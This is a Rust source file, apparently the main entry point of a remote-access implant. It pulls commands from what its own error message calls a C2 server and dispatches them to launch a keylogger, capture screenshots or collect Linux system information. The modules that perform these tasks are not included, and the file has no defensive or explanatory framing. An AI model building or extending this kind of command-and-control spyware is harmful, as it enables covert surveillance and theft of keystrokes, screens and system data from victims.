mod connexion;
mod input;
mod screenshot;
mod logs;

#[tokio::main]
async fn main() {
    match connexion::get_directives().await {
        Ok(commands) => {
            println!("Commands received: {:?}", commands);
            for command in commands {
                match command.as_str() {
                    "keylogger" => {
                        let handle = tokio::spawn(async {
                            input::start_keylogger(10).await;
                        });

                        if let Err(e) = handle.await {
                            eprintln!("La tâche keylogger a échoué : {:?}", e);
                        }
                    }
                    "screenshot" => {
                        let handle = tokio::spawn(async {
                            screenshot::take_screenshot().await;
                        });

                        if let Err(e) = handle.await {
                            eprintln!("La tâche screenshot a échoué : {:?}", e);
                        }
                    }
                    "logs" => {
                        let handle = tokio::spawn(async {
                            let log = logs::get_sysinfo_linux().await;
                            if let Err(e) = log {
                                eprintln!("Erreur logs : {:?}", e)
                            }
                        });

                        if let Err(e) = handle.await {
                            eprintln!("La tâche logs a échoué : {:?}", e);
                        }
                    }
                    _ => println!("Commande inconnue: {}", command),
                }
            }
        }
        Err(e) => eprintln!("Erreur avec la connexion au C2: {}", e),
    }
    
}
